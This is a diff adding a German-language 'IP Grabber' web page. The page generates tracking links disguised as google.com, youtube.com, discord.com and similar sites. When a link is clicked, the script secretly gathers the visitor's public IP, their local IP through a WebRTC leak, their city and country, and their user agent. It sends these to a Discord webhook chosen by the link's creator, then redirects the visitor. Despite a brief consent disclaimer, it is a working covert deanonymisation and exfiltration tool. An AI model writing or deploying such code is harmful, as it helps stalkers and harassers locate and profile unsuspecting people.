@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Grabber · Öffentlich + Geräte-IP</title>
+    <style>
+        body { visibility: hidden; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body.admin-mode { visibility: visible; background: #f1f5f9; min-height: 100vh; padding: 20px; color: #0f172a; }
+        .container { max-width: 900px; margin: 0 auto; background: white; border-radius: 28px; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1); padding: 30px; }
+        h1 { display: flex; align-items: center; gap: 10px; } h1::before { content: "🌐"; font-size: 2rem; }
+        .warning { background: #fffbeb; border: 1px solid #fcd34d; color: #92400e; padding: 16px; border-radius: 16px; margin-bottom: 28px; }
+        .tabs { display: flex; gap: 6px; margin-bottom: 24px; border-bottom: 2px solid #cbd5e1; }
+        .tab { padding: 12px 24px; background: none; border: none; cursor: pointer; font-weight: 600; color: #64748b; border-radius: 40px 40px 0 0; }
+        .tab.active { color: #2563eb; border-bottom: 3px solid #2563eb; background: white; }
+        .tab-content { display: none; } .tab-content.active { display: block; }
+        .form-group { margin-bottom: 24px; } label { display: block; margin-bottom: 8px; font-weight: 600; }
+        input, select, textarea { width: 100%; padding: 14px 18px; border: 1.5px solid #cbd5e1; border-radius: 20px; font-size: 1rem; background: white; }
+        button { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-weight: 600; cursor: pointer; }
+        button.copy-btn { background: #10b981; } button.secondary { background: #e2e8f0; color: #1e293b; }
+        .url-display { background: #f8fafc; padding: 16px; border-radius: 24px; font-family: monospace; word-break: break-all; border: 1.5px solid #cbd5e1; }
+        .stats { margin-top: 20px; padding: 16px; background: #f1f5f9; border-radius: 18px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; } th { background: #eef2ff; padding: 12px; } td { padding: 12px; border-bottom: 1px solid #e2e8f0; font-size: 0.9rem; }
+        .flex-row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+        .note { background: #f8fafc; padding: 8px 12px; border-radius: 12px; font-size: 0.85rem; color: #475569; margin-top: 6px; }
+        .mask-note { background: #e6f7ff; border-left: 4px solid #0284c7; padding: 12px 16px; border-radius: 12px; margin: 16px 0; }
+        .track-code { font-family: monospace; font-size: 1.4rem; font-weight: 700; letter-spacing: 3px; background: #eef2ff; color: #2563eb; padding: 10px 20px; border-radius: 16px; display: inline-block; }
+        .summary { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
+        .summary .box { background: #f1f5f9; border-radius: 16px; padding: 14px 20px; min-width: 140px; }
+        .summary .box b { display: block; font-size: 1.4rem; }
+    </style>
+</head>
+<body>
+    <div id="adminPanel" style="display:none;">
+        <div class="container">
+            <h1>IP‑Logger · Öffentliche + Geräte‑IP</h1>
+            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Zeigt öffentliche Internet‑IP und (optional) lokale Geräte‑IP.</div>
+            <div class="tabs">
+                <div class="tab active" data-tab="generator">🔗 Link Generator</div>
+                <div class="tab" data-tab="logs">📋 Tracking / Logs</div>
+                <div class="tab" data-tab="settings">⚙️ Einstellungen</div>
+            </div>
+            <!-- Generator -->
+            <div id="generator" class="tab-content active">
+                <div class="form-group"><label>🎯 Ziel‑URL</label><input type="url" id="targetUrl" value="https://example.com"></div>
+                <div class="form-group"><label>📡 Discord Webhook URL</label><input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..."><div class="flex-row" style="margin-top:8px;"><button class="secondary" id="testWebhookBtn">🧪 Webhook testen</button><span id="testResult"></span></div></div>
+                <div class="form-group"><label>🌍 Server‑Basis‑URL</label><input type="url" id="baseUrlInput" placeholder="Leer = aktuelle Adresse"></div>
+                <div class="form-group"><label>💬 Eigene Nachricht</label><input type="text" id="customMsg" placeholder="Neuer Klick"></div>
+                <div class="form-group"><label>👤 Kennzeichnung (z.B. Name des Empfängers)</label><input type="text" id="labelInput" placeholder="Max / Testperson 1"></div>
+
+                <!-- Tarn‑Domain Auswahl -->
+                <div class="form-group">
+                    <label>🎭 Tarn‑Domain (wie soll der Link aussehen?)</label>
+                    <select id="maskPreset">
+                        <option value="">Keine Tarnung (echte URL anzeigen)</option>
+                        <option value="https://google.com">google.com</option>
+                        <option value="https://youtube.com">youtube.com</option>
+                        <option value="https://facebook.com">facebook.com</option>
+                        <option value="https://twitter.com">twitter.com</option>
+                        <option value="https://instagram.com">instagram.com</option>
+                        <option value="https://tiktok.com">tiktok.com</option>
+                        <option value="https://discord.com">discord.com</option>
+                        <option value="custom">✨ Eigene Domain angeben</option>
+                    </select>
+                    <div id="customMaskContainer" style="display:none; margin-top:12px;">
+                        <input type="text" id="customMaskUrl" placeholder="https://deinedomain.de/pfad">
+                    </div>
+                    <div id="maskPathContainer" style="margin-top:12px;">
+                        <input type="text" id="maskPath" placeholder="optionaler Pfad (z.B. /gewinnspiel)">
+                    </div>
+                </div>
+
+                <button id="generateBtn">✨ Link generieren</button>
+                <div id="resultPanel" style="display:none; margin-top:28px;">
+                    <h3>🔽 Dein Link</h3>
+                    <div class="form-group">
+                        <label>🔑 Tracking‑Code</label>
+                        <div class="flex-row"><span class="track-code" id="trackCodeDisplay"></span><button class="secondary" id="copyTrackCodeBtn">📋 Code kopieren</button></div>
+                        <div class="note">Gib diesen Code im Tab „Tracking / Logs" ein, um alle Klicks zu diesem Link zu sehen.</div>
+                    </div>
+                    <div><strong>🔗 Echte URL:</strong><div class="url-display" id="realUrlDisplay" style="font-size:0.9rem; opacity:0.8;"></div></div>
+                    <div style="margin-top:16px;"><strong>🎭 Maskierte URL:</strong><div class="url-display" id="maskedUrlDisplay" style="font-weight:500;"></div></div>
+                    <div class="mask-note">⚠️ Der untere Link ist nur Anzeigetext. Der Empfänger klickt auf die echte URL.</div>
+                    <div class="flex-row" style="margin-top:16px;">
+                        <button class="copy-btn" id="copyMaskedBtn">📋 Tarn‑Link kopieren</button>
+                        <button class="secondary" id="copyRealBtn">📋 Echten Link kopieren</button>
+                        <button class="secondary" id="testOwnBtn">🧪 Selbst testen</button>
+                    </div>
+                    <div class="stats"><p>👁️ Klicks: <strong id="clickCount">0</strong> | Letzter: <span id="lastAccess">—</span></p></div>
+                </div>
+            </div>
+            <!-- Tracking / Logs -->
+            <div id="logs" class="tab-content">
+                <h3>📜 Tracking / Logs</h3>
+                <div class="form-group" style="margin-top:16px;">
+                    <label>🔑 Tracking‑Code eingeben</label>
+                    <div class="flex-row">
+                        <input type="text" id="trackCodeInput" placeholder="z.B. K7F2X9" style="flex:1; min-width:200px; text-transform:uppercase;">
+                        <button id="showLogsBtn">📊 Anzeigen</button>
+                        <button class="secondary" id="showAllBtn">Alle zeigen</button>
+                    </div>
+                </div>
+                <div id="logSummary" style="display:none;">
+                    <div class="summary">
+                        <div class="box"><span>Klicks gesamt</span><b id="sumClicks">0</b></div>
+                        <div class="box"><span>Verschiedene IPs</span><b id="sumIps">0</b></div>
+                        <div class="box"><span>Länder</span><b id="sumCountries">0</b></div>
+                        <div class="box"><span>Erster Klick</span><b id="sumFirst" style="font-size:0.9rem;">—</b></div>
+                        <div class="box"><span>Letzter Klick</span><b id="sumLast" style="font-size:0.9rem;">—</b></div>
+                    </div>
+                </div>
+                <table id="logsTable" style="display:none;">
+                    <thead><tr><th>#</th><th>🌍 Land</th><th>🏙️ Stadt</th><th>🌐 Öffentliche IP</th><th>🏠 Geräte‑IP</th><th>📅 Datum</th><th>🕐 Uhrzeit</th><th>🖥️ User‑Agent</th></tr></thead>
+                    <tbody id="logsBody"></tbody>
+                </table>
+                <div class="flex-row" style="margin-top:16px;">
+                    <button class="secondary" id="exportLogsBtn">⬇️ Als CSV exportieren</button>
+                    <button class="secondary" id="clearLogsBtn">🗑️ Alle löschen</button>
+                </div>
+            </div>
+            <!-- Einstellungen -->
+            <div id="settings" class="tab-content">
+                <h3>Einstellungen</h3>
+                <div class="form-group"><label>⏱️ Verzögerung (ms)</label><input type="number" id="delayInput" value="3000"></div>
+                <div class="form-group"><label><input type="checkbox" id="collectUACb" checked> User‑Agent erfassen</label></div>
+                <div class="form-group"><label><input type="checkbox" id="collectLocationCb" checked> Standort ermitteln (Land/Stadt via ipapi.co) – nötig für die Land‑Spalte</label></div>
+                <div class="form-group"><label><input type="checkbox" id="collectLocalIPCb"> 🏠 Geräte‑IP (lokal) via WebRTC ermitteln</label><div class="note">⚠️ Funktioniert nur unter HTTPS. Zeigt die private IP im Heimnetzwerk an.</div></div>
+                <div class="form-group"><label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label></div>
+                <div class="form-group"><label>Standard‑Basis‑URL</label><input type="url" id="defaultBaseUrl"></div>
+                <button id="saveSettingsBtn">💾 Speichern</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        (function(){
+            "use strict";
+            // ---------- STATE ----------
+            let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:true,collectLocalIP:false,storeLocal:true,defaultBase:''},currentLinkId=null;
+
+            // ---------- UTILS ----------
+            function generateId(){return Date.now()+'-'+Math.random().toString(36).substr(2,8);}
+            function generateTrackCode(){
+                const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+                let code='';
+                for(let i=0;i<6;i++)code+=chars[Math.floor(Math.random()*chars.length)];
+                // Eindeutigkeit sicherstellen
+                if(links.some(l=>l.trackCode===code))return generateTrackCode();
+                return code;
+            }
+            function formatDate(iso){return new Date(iso).toLocaleString('de-DE');}
+            function formatTime(iso){return new Date(iso).toLocaleTimeString('de-DE');}
+            function formatDateOnly(iso){return new Date(iso).toLocaleDateString('de-DE');}
+            function base64Encode(str){return btoa(unescape(encodeURIComponent(str)));}
+            function base64Decode(str){return decodeURIComponent(escape(atob(str)));}
+
+            // ---------- STORAGE ----------
+            function loadStorage(){
+                try{
+                    const l=localStorage.getItem('ipg_links');if(l)links=JSON.parse(l);
+                    const g=localStorage.getItem('ipg_logs');if(g)ipLogs=JSON.parse(g);
+                    const s=localStorage.getItem('ipg_settings');if(s)settings={...settings,...JSON.parse(s)};
+                }catch(e){}
+                if(document.getElementById('delayInput')){
+                    document.getElementById('delayInput').value=settings.delay;
+                    document.getElementById('collectUACb').checked=settings.collectUA;
+                    document.getElementById('collectLocationCb').checked=settings.collectLocation;
+                    document.getElementById('collectLocalIPCb').checked=settings.collectLocalIP;
+                    document.getElementById('storeLocalCb').checked=settings.storeLocal;
+                    document.getElementById('defaultBaseUrl').value=settings.defaultBase||'';
+                }
+            }
+            function saveLinks(){if(settings.storeLocal)localStorage.setItem('ipg_links',JSON.stringify(links));}
+            function saveLogs(){if(settings.storeLocal)localStorage.setItem('ipg_logs',JSON.stringify(ipLogs));}
+            function saveSettings(){
+                if(!document.getElementById('delayInput'))return;
+                settings.delay=parseInt(document.getElementById('delayInput').value,10)||3000;
+                settings.collectUA=document.getElementById('collectUACb').checked;
+                settings.collectLocation=document.getElementById('collectLocationCb').checked;
+                settings.collectLocalIP=document.getElementById('collectLocalIPCb').checked;
+                settings.storeLocal=document.getElementById('storeLocalCb').checked;
+                settings.defaultBase=document.getElementById('defaultBaseUrl').value.trim();
+                localStorage.setItem('ipg_settings',JSON.stringify(settings));
+            }
+
+            // ---------- IP-ERMITTLUNG ----------
+            async function fetchPublicIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return '0.0.0.0';}}
+            async function fetchLocalIP(){
+                if(!settings.collectLocalIP)return null;
+                return new Promise((resolve)=>{
+                    try{
+                        const pc=new RTCPeerConnection({iceServers:[]});
+                        pc.createDataChannel('');
+                        pc.createOffer().then(offer=>pc.setLocalDescription(offer)).catch(()=>{});
+                        pc.onicecandidate=(ice)=>{
+                            if(!ice||!ice.candidate||!ice.candidate.candidate)return;
+                            const candidate=ice.candidate.candidate;
+                            const ipRegex=/([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                            const match=candidate.match(ipRegex);
+                            if(match){
+                                const ip=match[1];
+                                if(!ip.startsWith('127.')&&!ip.startsWith('::1')){
+                                    pc.close();
+                                    resolve(ip);
+                                }
+                            }
+                        };
+                        setTimeout(()=>{pc.close();resolve(null);},3000);
+                    }catch(e){resolve(null);}
+                });
+            }
+            // Liefert jetzt {city, country, countryCode} statt nur String
+            async function fetchLocation(ip){
+                if(!settings.collectLocation)return null;
+                try{
+                    const r=await fetch(`https://ipapi.co/${ip}/json/`);
+                    const d=await r.json();
+                    if(d.error)return null;
+                    return {city:d.city||'Unbekannt',country:d.country_name||'Unbekannt',countryCode:d.country_code||''};
+                }catch(e){return null;}
+            }
+
+            // ---------- DISCORD SENDEN ----------
+            async function sendDiscord(webhookUrl, publicIP, localIP, ua, location, linkId, trackCode, customMsg, label){
+                if(!webhookUrl||!webhookUrl.includes('discord.com/api/webhooks'))return false;
+                const locationText=location?`\n📍 Standort: ${location.city}, ${location.country}${location.countryCode?' ('+location.countryCode+')':''}`:'';
+                const localIPText=localIP?`\n🏠 Geräte‑IP (lokal): \`${localIP}\``:'';
+                const labelText=label?`\n👤 Gekennzeichnet als: **${label}**`:'';
+                const description=`${customMsg||'Neuer Klick'}\n\n🔑 Tracking‑Code: **${trackCode||linkId}**\n🌐 Öffentliche IP: \`${publicIP}\`${localIPText}${locationText}${labelText}\n🖥️ User‑Agent: ${ua||'nicht erfasst'}`;
+                const embed={title:"🌍 IP‑Logger",description,color:0x3b82f6,timestamp:new Date().toISOString(),footer:{text:`Link‑ID: ${linkId}`}};
+                try{
+                    const resp=await fetch(webhookUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})});
+                    return resp.ok;
+                }catch(e){return false;}
+            }
+
+            // ---------- REDIRECT HANDLER ----------
+            async function handleRedirect(){
+                const params=new URLSearchParams(window.location.search);
+                const linkId=params.get('id'),target=params.get('to'),encodedWh=params.get('wh'),encodedMsg=params.get('msg'),encodedLabel=params.get('lbl'),trackCode=params.get('tc'),debug=params.get('debug')==='1';
+                if(!linkId||!target||!encodedWh)return false;
+                let webhookUrl='',customMsg='',label='';
+                try{
+                    webhookUrl=base64Decode(encodedWh);
+                    if(encodedMsg)customMsg=base64Decode(encodedMsg);
+                    if(encodedLabel)label=base64Decode(encodedLabel);
+                }catch(e){document.body.innerHTML='<h2>Fehler: Ungültiger Link</h2>';document.body.style.visibility='visible';return true;}
+                const publicIP=await fetchPublicIP();
+                const localIP=settings.collectLocalIP?await fetchLocalIP():null;
+                const ua=settings.collectUA?navigator.userAgent:null;
+                const location=settings.collectLocation?await fetchLocation(publicIP):null;
+                sendDiscord(webhookUrl,publicIP,localIP,ua,location,linkId,trackCode,customMsg,label);
+                if(settings.storeLocal){
+                    const logEntry={id:generateId(),publicIP,localIP,ua,location,label,linkId,trackCode:trackCode||null,timestamp:new Date().toISOString()};
+                    ipLogs.push(logEntry);saveLogs();
+                    const link=links.find(l=>l.id===linkId);
+                    if(link){link.clicks++;link.lastAccess=new Date().toISOString();saveLinks();}
+                }
+                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debug?`<p>Öffentliche IP: ${publicIP}<br>Geräte‑IP: ${localIP||'aus'}<br>Standort: ${location?location.city+', '+location.country:'aus'}<br>Label: ${label||'keine'}</p>`:''}</div></div>`;
+                document.body.style.visibility='visible';
+                setTimeout(()=>{window.location.href=target;},settings.delay);
+                return true;
+            }
+
+            // ---------- TRACKING / LOGS ----------
+            function renderLogsFor(code){
+                const tbody=document.getElementById('logsBody');
+                const table=document.getElementById('logsTable');
+                const summary=document.getElementById('logSummary');
+                let entries=code?[...ipLogs].filter(l=>(l.trackCode&&l.trackCode.toUpperCase()===code)||l.linkId.slice(-6).toUpperCase()===code):[...ipLogs].reverse();
+                if(code)entries.reverse();
+                if(!entries.length){
+                    table.style.display='none';summary.style.display='none';
+                    tbody.innerHTML='';return;
+                }
+                table.style.display='table';summary.style.display='flex';
+                tbody.innerHTML=entries.map((l,i)=>{
+                    const loc=l.location||{};
+                    return `<tr><td>${i+1}</td><td>${loc.countryCode?`<b>${loc.countryCode}</b> `:''}${loc.country||'-'}</td><td>${loc.city||'-'}</td><td><code>${l.publicIP||l.ip||'-'}</code></td><td><code>${l.localIP||'-'}</code></td><td>${formatDateOnly(l.timestamp)}</td><td>${formatTime(l.timestamp)}</td><td title="${l.ua||''}">${l.ua?(l.ua.length>30?l.ua.substring(0,30)+'…':l.ua):'-'}</td></tr>`;
+                }).join('');
+                // Zusammenfassung
+                const ips=new Set(entries.map(l=>l.publicIP||l.ip).filter(Boolean));
+                const countries=new Set(entries.map(l=>l.location&&l.location.country).filter(Boolean));
+                document.getElementById('sumClicks').textContent=entries.length;
+                document.getElementById('sumIps').textContent=ips.size;
+                document.getElementById('sumCountries').textContent=countries.size;
+                document.getElementById('sumFirst').textContent=formatDate(entries[entries.length-1].timestamp);
+                document.getElementById('sumLast').textContent=formatDate(entries[0].timestamp);
+                // Klickzähler des zugehörigen Links
+                if(code){
+                    const link=links.find(l=>l.trackCode===code);
+                    if(link)document.getElementById('sumClicks').textContent=`${entries.length} / ${link.clicks}`;
+                }
+                // CSV-Export Daten merken
+                window._lastExport=entries;
+            }
+
+            function exportCsv(){
+                const rows=window._lastExport||[];
+                if(!rows.length)return alert('Keine Daten zum Exportieren.');
+                const csv=['Nr;Land;Stadt;Oeffentliche IP;Geraete-IP;Datum;Uhrzeit;User-Agent;Tracking-Code;Label',
+                    ...rows.map((l,i)=>[i+1,l.location?.country||'',l.location?.city||'',l.publicIP||'',l.localIP||'',formatDateOnly(l.timestamp),formatTime(l.timestamp),l.ua||'',l.trackCode||'',l.label||''].map(v=>`"${String(v).replace(/"/g,'""')}"`).join(';'))
+                ].join('\n');
+                const blob=new Blob(['\ufeff'+csv],{type:'text/csv;charset=utf-8'});
+                const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='ip-logs.csv';a.click();
+            }
+
+            // ---------- ADMIN PANEL ----------
+            function showAdminPanel(){
+                document.getElementById('adminPanel').style.display='block';
+                document.body.classList.add('admin-mode');
+                document.body.style.visibility='visible';
+                initAdminUI();
+                renderLogsFor(null);
+                const presetSelect=document.getElementById('maskPreset');
+                const customContainer=document.getElementById('customMaskContainer');
+                presetSelect.addEventListener('change',()=>{
+                    customContainer.style.display=presetSelect.value==='custom'?'block':'none';
+                });
+                // Enter im Tracking-Feld
+                document.getElementById('trackCodeInput').addEventListener('keydown',e=>{
+                    if(e.key==='Enter')document.getElementById('showLogsBtn').click();
+                });
+            }
+            function initAdminUI(){
+                document.querySelectorAll('.tab').forEach(t=>{t.addEventListener('click',()=>{document.querySelectorAll('.tab,.tab-content').forEach(el=>el.classList.remove('active'));t.classList.add('active');document.getElementById(t.dataset.tab).classList.add('active');})});
+
+                document.getElementById('generateBtn').addEventListener('click',()=>{
+                    const target=document.getElementById('targetUrl').value.trim();
+                    const webhook=document.getElementById('webhookInput').value.trim();
+                    if(!target||!webhook){alert('Ziel-URL und Webhook erforderlich');return;}
+                    if(!webhook.includes('discord.com/api/webhooks')){alert('Ungültige Webhook-URL');return;}
+                    const customMsg=document.getElementById('customMsg').value.trim();
+                    const label=document.getElementById('labelInput').value.trim();
+                    const linkId=generateId();
+                    const trackCode=generateTrackCode();
+                    let base=document.getElementById('baseUrlInput').value.trim();
+                    if(!base)base=settings.defaultBase;
+                    if(!base)base=window.location.origin+window.location.pathname;
+                    if(!base.endsWith('/')&&!base.includes('?'))base+='/';
+
+                    let maskedUrl='';
+                    const preset=document.getElementById('maskPreset').value;
+                    const path=document.getElementById('maskPath').value.trim();
+                    if(preset==='custom'){
+                        maskedUrl=document.getElementById('customMaskUrl').value.trim();
+                    }else if(preset){
+                        maskedUrl=preset+(path?path:'');
+                    }
+
+                    const encodedWh=base64Encode(webhook);
+                    const params=new URLSearchParams();
+                    params.set('id',linkId);params.set('to',target);params.set('wh',encodedWh);params.set('tc',trackCode);
+                    if(customMsg)params.set('msg',base64Encode(customMsg));
+                    if(label)params.set('lbl',base64Encode(label));
+                    const realUrl=base+(base.includes('?')?'&':'?')+params.toString();
+
+                    const newLink={id:linkId,trackCode,target,webhook,customMsg,label,maskedUrl:maskedUrl||null,clicks:0,lastAccess:null};
+                    links.push(newLink);saveLinks();
+
+                    document.getElementById('resultPanel').style.display='block';
+                    document.getElementById('trackCodeDisplay').textContent=trackCode;
+                    document.getElementById('realUrlDisplay').textContent=realUrl;
+                    document.getElementById('maskedUrlDisplay').textContent=maskedUrl||realUrl;
+                    document.getElementById('linkIdDisplay')&&(document.getElementById('linkIdDisplay').textContent=linkId);
+                    currentLinkId=linkId;
+                    document.getElementById('clickCount').textContent='0';
+                    document.getElementById('lastAccess').textContent='—';
+                });
+
+                document.getElementById('copyTrackCodeBtn').addEventListener('click',()=>{
+                    navigator.clipboard?.writeText(document.getElementById('trackCodeDisplay').textContent).then(()=>alert('Tracking-Code kopiert!'));
+                });
+                document.getElementById('copyMaskedBtn').addEventListener('click',()=>{
+                    navigator.clipboard?.writeText(document.getElementById('maskedUrlDisplay').textContent).then(()=>alert('Tarn‑Link kopiert!'));
+                });
+                document.getElementById('copyRealBtn').addEventListener('click',()=>{
+                    navigator.clipboard?.writeText(document.getElementById('realUrlDisplay').textContent).then(()=>alert('Echter Link kopiert!'));
+                });
+                document.getElementById('testOwnBtn').addEventListener('click',()=>{
+                    if(!currentLinkId)return alert('Kein Link generiert.');
+                    window.open(document.getElementById('realUrlDisplay').textContent+'&debug=1','_blank');
+                });
+                document.getElementById('testWebhookBtn').addEventListener('click',async()=>{
+                    const wh=document.getElementById('webhookInput').value.trim();
+                    if(!wh)return alert('Webhook eingeben');
+                    const ok=await sendDiscord(wh,'Test-Public','Test-Local','Test-UA',{city:'Test-Stadt',country:'Test-Land',countryCode:'TL'},'test','TESTC0','Testnachricht','TestLabel');
+                    document.getElementById('testResult').textContent=ok?'✅ Erfolg':'❌ Fehler';
+                });
+
+                document.getElementById('showLogsBtn').addEventListener('click',()=>{
+                    const code=document.getElementById('trackCodeInput').value.trim().toUpperCase();
+                    if(!code)return alert('Bitte Tracking-Code eingeben oder „Alle zeigen" klicken.');
+                    renderLogsFor(code);
+                });
+                document.getElementById('showAllBtn').addEventListener('click',()=>{
+                    document.getElementById('trackCodeInput').value='';
+                    renderLogsFor(null);
+                });
+                document.getElementById('exportLogsBtn').addEventListener('click',exportCsv);
+                document.getElementById('clearLogsBtn').addEventListener('click',()=>{ipLogs=[];saveLogs();renderLogsFor(null);});
+                document.getElementById('saveSettingsBtn').addEventListener('click',()=>{saveSettings();alert('Gespeichert');});
+            }
+
+            // ---------- START ----------
+            loadStorage();
+            (async function(){if(!(await handleRedirect()))showAdminPanel();})();
+        })();
+    </script>
+</body>
+</html>
